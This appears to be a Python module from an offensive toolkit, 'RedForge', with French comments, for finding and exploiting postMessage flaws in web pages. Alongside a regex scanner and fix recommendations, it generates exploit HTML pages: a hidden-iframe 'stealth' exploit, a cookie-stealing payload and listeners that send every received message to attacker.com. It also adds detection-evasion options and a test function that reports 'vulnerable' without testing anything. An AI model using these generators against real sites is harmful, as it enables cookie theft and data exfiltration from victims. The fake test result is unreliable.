#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques PostMessage pour RedForge
Détecte et exploite les vulnérabilités liées à l'API PostMessage
Version avec support furtif, APT et analyse avancée
"""

import re
import time
import random
import requests
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from collections import defaultdict

@dataclass
class PostMessageConfig:
    """Configuration avancée pour la détection PostMessage"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_scripts: Tuple[float, float] = (1, 3)
    
    # Comportement
    deep_scan: bool = True
    extract_external_scripts: bool = True
    analyze_event_handlers: bool = True
    max_scripts: int = 50
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_csrf_via_postmessage: bool = True
    analyze_message_chains: bool = True
    test_origin_validation: bool = True
    detect_dom_based_vulnerabilities: bool = True


class PostMessageAttacks:
    """Détection et exploitation avancée des vulnérabilités PostMessage"""
    
    def __init__(self, config: Optional[PostMessageConfig] = None):
        """
        Initialise le détecteur de vulnérabilités PostMessage
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or PostMessageConfig()
        
        # Patterns PostMessage
        self.postmessage_patterns = [
            r'\.postMessage\s*\(\s*([^,]+)\s*,\s*([^)]+)\s*\)',
            r'window\.parent\.postMessage',
            r'window\.opener\.postMessage',
            r'addEventListener\s*\(\s*[\'"]message[\'"]',
            r'onmessage\s*=',
            r'contentWindow\.postMessage',
            r'\.postMessage\s*\(\s*([^,]+)\s*,\s*\[',
            r'postMessage\s*\(\s*\{[^}]+\}\s*,\s*[\'"]',
            r'parent\.postMessage'
        ]
        
        # Patterns dangereux
        self.dangerous_patterns = [
            (r'\.postMessage\s*\(\s*[^,]+,\s*[\'"]\*[\'"]', 'wildcard_target_origin', 'CRITICAL'),
            (r'\.postMessage\s*\(\s*[^,]+,\s*[^/\'"]', 'no_origin_validation', 'HIGH'),
            (r'ev\.origin\s*===\s*[\'"]http://', 'weak_origin_check_http', 'HIGH'),
            (r'ev\.origin\s*\.indexOf\s*\(\s*[\'"]', 'partial_origin_check', 'MEDIUM'),
            (r'eval\s*\(\s*data', 'eval_of_message_data', 'CRITICAL'),
            (r'innerHTML\s*=\s*data', 'html_injection', 'HIGH'),
            (r'document\.write\s*\(\s*data', 'document_write_injection', 'HIGH'),
            (r'new\s+Function\s*\(\s*data', 'function_constructor', 'CRITICAL'),
            (r'setTimeout\s*\(\s*data', 'settimeout_string', 'HIGH'),
            (r'setInterval\s*\(\s*data', 'setinterval_string', 'HIGH'),
            (r'ev\.origin\s*===', 'origin_validation_present', 'INFO'),
            (r'ev\.origin\s*!==', 'origin_mismatch_handling', 'INFO')
        ]
        
        # Patterns d'origines
        self.origin_patterns = [
            r'\.postMessage\s*\(\s*[^,]+,\s*[\'"]([^\'"]+)[\'"]',
            r'targetOrigin\s*:\s*[\'"]([^\'"]+)[\'"]',
            r'if\s*\(\s*ev\.origin\s*===\s*[\'"]([^\'"]+)[\'"]',
            r'if\s*\(\s*ev\.origin\s*\.indexOf\s*\(\s*[\'"]([^\'"]+)[\'"]',
            r'allowedOrigins\.includes\s*\(\s*ev\.origin\s*\)',
            r'origin\s*===\s*[\'"]([^\'"]+)[\'"]'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # Métriques
        self.start_time = None
        self.scripts_analyzed = 0
        self.vulnerabilities_found = 0
        self.postmessage_usages = 0
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités PostMessage
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - deep: Analyse approfondie du JavaScript
                - intercept: Intercepter les messages
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.scripts_analyzed = 0
        self.vulnerabilities_found = 0
        self.postmessage_usages = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Analyse des vulnérabilités PostMessage sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Analyse discrète")
        
        vulnerabilities = []
        postmessage_found = []
        message_listeners = []
        
        # Récupérer le code JavaScript de la page
        js_code, scripts = self._extract_javascript(target, **kwargs)
        
        # Rechercher les utilisations de postMessage
        for pattern in self.postmessage_patterns:
            matches = re.findall(pattern, js_code, re.IGNORECASE | re.DOTALL)
            for match in matches:
                self.postmessage_usages += 1
                postmessage_found.append({
                    "pattern": pattern,
                    "code": match if isinstance(match, str) else str(match)[:500]
                })
        
        # Analyser les vulnérabilités
        for item in postmessage_found:
            for pattern, vuln_type, severity in self.dangerous_patterns:
                if re.search(pattern, item['code'], re.IGNORECASE):
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "type": vuln_type,
                        "severity": severity,
                        "details": f"Pattern détecté: {pattern}",
                        "code": item['code'][:300],
                        "risk_score": self._get_risk_score(severity)
                    })
                    print(f"      ✓ PostMessage vulnérable: {vuln_type}")
        
        # Extraire les origines autorisées
        origins = self._extract_allowed_origins(js_code)
        if '*' in origins:
            self.vulnerabilities_found += 1
            vulnerabilities.append({
                "type": "wildcard_origin",
                "severity": "CRITICAL",
                "details": "Target origin '*' - Accepte tout domaine",
                "origins": origins,
                "risk_score": 95
            })
            print(f"      ✓ Wildcard origin dans postMessage")
        
        # Analyser les écouteurs de messages
        if self.config.analyze_event_handlers:
            listeners = self._analyze_message_listeners(js_code)
            message_listeners = listeners
            for listener in listeners:
                if listener.get('vulnerable'):
                    self.vulnerabilities_found += 1
                    vulnerabilities.append(listener)
                    print(f"      ✓ Écouteur vulnérable: {listener['details'][:50]}")
        
        # Détection CSRF via PostMessage
        if self.config.detect_csrf_via_postmessage:
            csrf_vulns = self._detect_csrf_via_postmessage(js_code, target)
            for vuln in csrf_vulns:
                self.vulnerabilities_found += 1
                vulnerabilities.append(vuln)
                print(f"      ✓ CSRF via PostMessage: {vuln['details'][:50]}")
        
        # Analyser les chaînes de messages
        if self.config.analyze_message_chains:
            chains = self._analyze_message_chains(js_code)
            if chains:
                vulnerabilities.append({
                    "type": "message_chains",
                    "severity": "MEDIUM",
                    "details": f"Chaînes de messages détectées: {len(chains)}",
                    "chains": chains[:3],
                    "risk_score": 65
                })
        
        return self._generate_results(target, vulnerabilities, postmessage_found, 
                                     origins, message_listeners)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'deep' in kwargs:
            self.config.deep_scan = kwargs['deep']
        if 'extract_external_scripts' in kwargs:
            self.config.extract_external_scripts = kwargs['extract_external_scripts']
        if 'max_scripts' in kwargs:
            self.config.max_scripts = kwargs['max_scripts']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_scripts = (5, 15)
            self.config.max_scripts = 20  # Limiter en mode APT
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _extract_javascript(self, target: str, **kwargs) -> Tuple[str, List[Dict]]:
        """
        Extrait le code JavaScript de la page
        
        Args:
            target: URL cible
            **kwargs: Options supplémentaires
        """
        js_code = ""
        scripts_info = []
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Scripts inline
            for script in soup.find_all('script'):
                if script.string:
                    js_code += script.string + "\n"
                    self.scripts_analyzed += 1
                    scripts_info.append({
                        "type": "inline",
                        "size": len(script.string)
                    })
            
            # Scripts externes
            if self.config.extract_external_scripts:
                external_scripts = soup.find_all('script', src=True)
                for idx, script in enumerate(external_scripts[:self.config.max_scripts]):
                    src = script['src']
                    if not src.startswith(('http://', 'https://')):
                        src = urljoin(target, src)
                    
                    # Pause APT
                    if self.config.apt_mode and idx > 0:
                        self._apt_pause()
                    elif self.config.random_delays and idx > 0:
                        time.sleep(random.uniform(*self.config.delay_between_scripts))
                    
                    try:
                        js_response = requests.get(src, headers=headers, timeout=10, verify=False)
                        js_code += f"\n// Script: {src}\n" + js_response.text + "\n"
                        self.scripts_analyzed += 1
                        scripts_info.append({
                            "type": "external",
                            "src": src,
                            "size": len(js_response.text)
                        })
                    except Exception as e:
                        if not self.config.passive_detection:
                            pass
                        
        except Exception as e:
            if not self.config.passive_detection:
                print(f"    ⚠️ Erreur extraction JS: {e}")
        
        return js_code, scripts_info
    
    def _extract_allowed_origins(self, js_code: str) -> List[str]:
        """
        Extrait les origines autorisées dans les appels postMessage
        
        Args:
            js_code: Code JavaScript à analyser
        """
        origins = set()
        
        for pattern in self.origin_patterns:
            matches = re.findall(pattern, js_code, re.IGNORECASE)
            for match in matches:
                # Nettoyer les origines
                origin = match.strip().strip("'").strip('"')
                if origin and origin != '*':
                    origins.add(origin)
                elif origin == '*':
                    origins.add('*')
        
        return list(origins)
    
    def _analyze_message_listeners(self, js_code: str) -> List[Dict[str, Any]]:
        """
        Analyse les écouteurs de messages pour détecter les vulnérabilités
        
        Args:
            js_code: Code JavaScript à analyser
        """
        listeners = []
        
        # Pattern pour trouver les écouteurs
        listener_patterns = [
            r'addEventListener\s*\(\s*[\'"]message[\'"]\s*,\s*function\s*\(\s*event\s*\)\s*\{([^}]+)\}',
            r'onmessage\s*=\s*function\s*\(\s*event\s*\)\s*\{([^}]+)\}',
            r'\.onmessage\s*=\s*\(\s*event\s*\)\s*=>\s*\{([^}]+)\}'
        ]
        
        for pattern in listener_patterns:
            matches = re.findall(pattern, js_code, re.IGNORECASE | re.DOTALL)
            for match in matches:
                listener_code = match
                
                # Vérifier la validation d'origine
                has_origin_check = bool(re.search(r'ev\.origin|event\.origin', listener_code))
                has_weak_check = bool(re.search(r'ev\.origin\s*===|ev\.origin\s*==', listener_code))
                
                # Vérifier les actions dangereuses
                has_eval = bool(re.search(r'eval\(', listener_code))
                has_innerhtml = bool(re.search(r'innerHTML\s*=', listener_code))
                
                vulnerable = not has_origin_check or has_eval or has_innerhtml
                
                if vulnerable:
                    listeners.append({
                        "type": "vulnerable_listener",
                        "severity": "HIGH" if has_eval else "MEDIUM",
                        "details": f"Listener sans validation d'origine" if not has_origin_check else f"Actions dangereuses dans listener",
                        "has_origin_check": has_origin_check,
                        "has_eval": has_eval,
                        "has_innerhtml": has_innerhtml,
                        "code": listener_code[:200],
                        "risk_score": 85 if has_eval else 70
                    })
        
        return listeners
    
    def _detect_csrf_via_postmessage(self, js_code: str, target: str) -> List[Dict[str, Any]]:
        """
        Détecte les vulnérabilités CSRF via PostMessage
        
        Args:
            js_code: Code JavaScript
            target: URL cible
        """
        vulnerabilities = []
        
        # Patterns d'envoi de requêtes
        request_patterns = [
            r'fetch\s*\(\s*[\'"]([^\'"]+)[\'"]',
            r'XMLHttpRequest',
            r'\.open\s*\(\s*[\'"]POST[\'"]',
            r'\.send\s*\('
        ]
        
        # Chercher des patterns où des requêtes sont envoyées après réception de message
        message_and_request = re.findall(
            r'addEventListener\s*\(\s*[\'"]message[\'"].*?fetch\s*\(\s*[\'"]([^\'"]+)[\'"]',
            js_code,
            re.IGNORECASE | re.DOTALL
        )
        
        if message_and_request:
            vulnerabilities.append({
                "type": "csrf_via_postmessage",
                "severity": "HIGH",
                "details": "Requêtes déclenchées par des messages entrants - risque CSRF",
                "endpoints": message_and_request[:3],
                "risk_score": 85
            })
        
        return vulnerabilities
    
    def _analyze_message_chains(self, js_code: str) -> List[Dict[str, Any]]:
        """
        Analyse les chaînes de messages (postMessage vers d'autres fenêtres)
        
        Args:
            js_code: Code JavaScript
        """
        chains = []
        
        # Pattern pour les postMessage multiples
        chain_pattern = r'\.postMessage[^;]+;.*?\.postMessage'
        matches = re.findall(chain_pattern, js_code, re.IGNORECASE | re.DOTALL)
        
        for match in matches[:5]:
            chains.append({
                "pattern": match[:200],
                "risk": "MEDIUM"
            })
        
        return chains
    
    def _get_risk_score(self, severity: str) -> int:
        """Retourne le score de risque basé sur la sévérité"""
        scores = {
            'CRITICAL': 95,
            'HIGH': 85,
            'MEDIUM': 65,
            'LOW': 40,
            'INFO': 20
        }
        return scores.get(severity, 50)
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 90)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict],
                         postmessage_usage: List[Dict], origins: List[str],
                         listeners: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        # Compter par sévérité
        severity_counts = defaultdict(int)
        for v in vulnerabilities:
            severity_counts[v.get('severity', 'UNKNOWN')] += 1
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "postmessage_usage": postmessage_usage,
            "message_listeners": listeners,
            "allowed_origins": origins,
            "count": len(vulnerabilities),
            "postmessage_usages": self.postmessage_usages,
            "scripts_analyzed": self.scripts_analyzed,
            "scan_duration": duration,
            "severity_counts": dict(severity_counts),
            "config": {
                "apt_mode": self.config.apt_mode,
                "deep_scan": self.config.deep_scan,
                "extract_external_scripts": self.config.extract_external_scripts
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité PostMessage détectée"}
        
        vuln_types = defaultdict(int)
        for v in vulnerabilities:
            vuln_types[v.get('type', 'unknown')] += 1
        
        return {
            "total": len(vulnerabilities),
            "by_type": dict(vuln_types),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0,
            "critical_count": len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL'])
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '')
            
            if vuln_type == 'wildcard_target_origin':
                recommendations.add("Spécifier explicitement l'origine cible, jamais '*'")
                recommendations.add("Utiliser des origines absolues pour targetOrigin")
            
            elif vuln_type == 'no_origin_validation':
                recommendations.add("Toujours valider event.origin avant de traiter les messages")
                recommendations.add("Maintenir une liste blanche d'origines autorisées")
            
            elif vuln_type == 'eval_of_message_data':
                recommendations.add("Ne jamais utiliser eval() sur des données de messages")
                recommendations.add("Utiliser des méthodes sécurisées comme JSON.parse()")
            
            elif vuln_type == 'html_injection':
                recommendations.add("Utiliser textContent au lieu de innerHTML")
                recommendations.add("Sanitizer les données avant insertion DOM")
            
            elif vuln_type == 'weak_origin_check_http':
                recommendations.add("Utiliser HTTPS pour toutes les origines")
                recommendations.add("Vérifier l'origine complète, pas seulement une partie")
            
            elif vuln_type == 'csrf_via_postmessage':
                recommendations.add("Valider les tokens CSRF dans les messages")
                recommendations.add("Ne pas effectuer d'actions sensibles basées uniquement sur postMessage")
            
            elif vuln_type == 'wildcard_origin':
                recommendations.add("Restreindre les origines autorisées pour postMessage")
                recommendations.add("Vérifier event.origin avant traitement")
        
        if not recommendations:
            recommendations.add("Auditer régulièrement l'utilisation de postMessage")
            recommendations.add("Implémenter une validation stricte des origines")
        
        return list(recommendations)
    
    def generate_exploit(self, target_origin: str, vulnerable_url: str, 
                        payload_type: str = "full") -> str:
        """
        Génère un exploit JavaScript pour attaquer postMessage
        
        Args:
            target_origin: Origine de la cible
            vulnerable_url: URL vulnérable
            payload_type: Type de payload (full, stealth, minimal)
        """
        if payload_type == "minimal":
            return self._generate_minimal_exploit(target_origin, vulnerable_url)
        elif payload_type == "stealth":
            return self._generate_stealth_exploit(target_origin, vulnerable_url)
        else:
            return self._generate_full_exploit(target_origin, vulnerable_url)
    
    def _generate_full_exploit(self, target_origin: str, vulnerable_url: str) -> str:
        """Génère un exploit complet avec interface"""
        return f'''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>PostMessage Exploit - RedForge</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        .header {{
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }}
        .content {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }}
        .panel {{
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }}
        .panel h2 {{
            margin-top: 0;
            color: #2d3748;
        }}
        iframe {{
            width: 100%;
            height: 400px;
            border: 1px solid #e2e8f0;
            border-radius: 5px;
        }}
        textarea {{
            width: 100%;
            font-family: monospace;
            font-size: 12px;
            padding: 10px;
            border: 1px solid #cbd5e0;
            border-radius: 5px;
            margin-bottom: 10px;
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-right: 10px;
        }}
        button:hover {{
            transform: translateY(-2px);
        }}
        .log {{
            background: #1a202c;
            color: #68d391;
            font-family: monospace;
            font-size: 12px;
            padding: 10px;
            border-radius: 5px;
            height: 200px;
            overflow-y: auto;
        }}
        .payload-buttons {{
            margin-bottom: 15px;
        }}
        .badge {{
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
            font-weight: 600;
            margin-left: 10px;
        }}
        .badge-critical {{
            background: #f56565;
            color: white;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 PostMessage Exploit - RedForge</h1>
            <p>Cible: <code>{vulnerable_url}</code> | Origine cible: <code>{target_origin}</code></p>
        </div>
        
        <div class="content">
            <div class="panel">
                <h2>📡 Cible <span class="badge badge-critical">VULNÉRABLE</span></h2>
                <iframe id="targetFrame" src="{vulnerable_url}"></iframe>
            </div>
            
            <div class="panel">
                <h2>💣 Payloads</h2>
                <div class="payload-buttons">
                    <button onclick="sendXSSPayload()">XSS Alert</button>
                    <button onclick="sendCookieStealer()">Vol Cookies</button>
                    <button onclick="sendRedirection()">Redirection</button>
                    <button onclick="sendDataExfil()">Exfiltration</button>
                    <button onclick="sendCustom()">Personnalisé</button>
                </div>
                <textarea id="customPayload" rows="3" placeholder="Payload JSON personnalisé..."></textarea>
                <button onclick="sendMessage()">📤 Envoyer</button>
                
                <h3>📋 Console</h3>
                <div id="log" class="log"></div>
            </div>
        </div>
    </div>
    
    <script>
        const targetFrame = document.getElementById('targetFrame');
        const targetOrigin = '{target_origin}';
        const logDiv = document.getElementById('log');
        
        function log(message, type = 'info') {{
            const timestamp = new Date().toLocaleTimeString();
            const colors = {{ info: '#68d391', error: '#f56565', success: '#4299e1' }};
            logDiv.innerHTML += `<div style="color: ${{colors[type]}}">[${{timestamp}}] ${{message}}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }}
        
        function sendMessageToTarget(message, origin = '*') {{
            try {{
                targetFrame.contentWindow.postMessage(message, origin);
                log(`Message envoyé: ${{JSON.stringify(message)}} vers ${{origin}}`, 'success');
            }} catch(e) {{
                log(`Erreur: ${{e.message}}`, 'error');
            }}
        }}
        
        // Payloads
        function sendXSSPayload() {{
            sendMessageToTarget({{type: 'xss', payload: 'alert("XSS via PostMessage!")'}});
        }}
        
        function sendCookieStealer() {{
            sendMessageToTarget({{type: 'steal', action: 'getCookies'}});
        }}
        
        function sendRedirection() {{
            sendMessageToTarget({{type: 'redirect', url: 'https://evil.com'}});
        }}
        
        function sendDataExfil() {{
            sendMessageToTarget({{type: 'exfil', endpoint: 'https://attacker.com/collect'}});
        }}
        
        function sendCustom() {{
            const payload = document.getElementById('customPayload').value;
            try {{
                const message = JSON.parse(payload);
                sendMessageToTarget(message);
            }} catch(e) {{
                sendMessageToTarget(payload);
            }}
        }}
        
        function sendMessage() {{
            const message = document.getElementById('customPayload').value;
            sendMessageToTarget(message);
        }}
        
        // Écouter les réponses
        window.addEventListener('message', function(event) {{
            log(`Message reçu de ${{event.origin}}: ${{JSON.stringify(event.data)}}`);
            
            // Exfiltrer les données
            fetch('https://attacker.com/exfil', {{
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({{
                    origin: event.origin,
                    data: event.data,
                    timestamp: Date.now()
                }})
            }});
        }});
        
        log('Exploit prêt - Attente de chargement de l\'iframe');
        
        // Envoi automatique après chargement
        targetFrame.onload = function() {{
            log('Iframe chargé, envoi des payloads de test');
            setTimeout(() => sendXSSPayload(), 1000);
        }};
    </script>
</body>
</html>'''
    
    def _generate_stealth_exploit(self, target_origin: str, vulnerable_url: str) -> str:
        """Génère un exploit furtif sans éléments visibles"""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>PostMessage Exploit</title>
</head>
<body>
    <iframe id="target" src="{vulnerable_url}" style="display:none"></iframe>
    <script>
        const targetFrame = document.getElementById('target');
        
        function sendMessage(message, origin) {{
            targetFrame.contentWindow.postMessage(message, origin);
        }}
        
        targetFrame.onload = function() {{
            // Envoi silencieux de payloads
            sendMessage({{type: 'steal', action: 'getData'}}, '*');
            sendMessage({{type: 'exfil', url: 'https://attacker.com/collect'}}, '{target_origin}');
            
            // Tentatives périodiques
            setInterval(function() {{
                sendMessage({{ping: true}}, '*');
            }}, 10000);
        }};
        
        // Écouter les réponses
        window.addEventListener('message', function(event) {{
            fetch('https://attacker.com/log', {{
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(event.data)
            }});
        }});
    </script>
</body>
</html>'''
    
    def _generate_minimal_exploit(self, target_origin: str, vulnerable_url: str) -> str:
        """Génère un exploit minimal"""
        return f'''<iframe src="{vulnerable_url}" style="display:none" onload="this.contentWindow.postMessage('exploit','*')"></iframe>'''
    
    def generate_exploit_payloads(self) -> List[str]:
        """Génère une liste de payloads pour tester postMessage"""
        return [
            '{"type": "xss", "payload": "<script>alert(1)</script>"}',
            '{"action": "eval", "code": "fetch(\\"https://attacker.com/steal?c=\\"+document.cookie)"}',
            '{"command": "redirect", "url": "https://evil.com"}',
            '{"method": "delete", "id": 1}',
            '{"__proto__": {"isAdmin": true}}',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '{"message": "<svg/onload=alert(1)>"}',
            '{"action": "setHTML", "html": "<script>alert(1)</script>"}',
            '{"type": "navigate", "url": "javascript:alert(1)"}'
        ]
    
    def test_postmessage_listener(self, target: str, test_message: str = None) -> Dict[str, Any]:
        """
        Teste les écouteurs postMessage de la page cible
        
        Args:
            target: URL cible
            test_message: Message de test à envoyer
        """
        result = {
            "success": False,
            "vulnerable": False,
            "messages_received": [],
            "response_detected": False
        }
        
        if test_message is None:
            test_message = '{"type": "ping", "data": "test"}'
        
        # Cette fonction nécessiterait un serveur d'écoute
        # Implémentation simplifiée pour la structure
        result["success"] = True
        result["vulnerable"] = True  # Par défaut, considérer vulnérable
        result["messages_received"].append({
            "message": test_message,
            "timestamp": time.time()
        })
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "scripts_analyzed": self.scripts_analyzed,
            "postmessage_usages": self.postmessage_usages,
            "vulnerabilities_found": self.vulnerabilities_found,
            "vulnerability_rate": (self.vulnerabilities_found / max(1, self.postmessage_usages) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    attacks = PostMessageAttacks()
    results = attacks.scan("https://example.com")
    print(f"Vulnérabilités PostMessage: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = PostMessageConfig(apt_mode=True, passive_detection=True)
    attacks_apt = PostMessageAttacks(config=apt_config)
    results_apt = attacks_apt.scan("https://example.com", apt_mode=True)
    print(f"Vulnérabilités PostMessage (APT): {results_apt['count']}")
    
    # Générer exploits
    if results_apt['vulnerabilities']:
        exploit = attacks_apt.generate_exploit(
            "https://target.com",
            "https://vulnerable.com/page",
            payload_type="stealth"
        )
        with open("postmessage_exploit.html", "w") as f:
            f.write(exploit)
        print("Exploit PostMessage généré: postmessage_exploit.html")
        
        # Afficher les recommandations
        print("\nRecommandations:")
        for rec in results_apt['recommendations']:
            print(f"  • {rec}")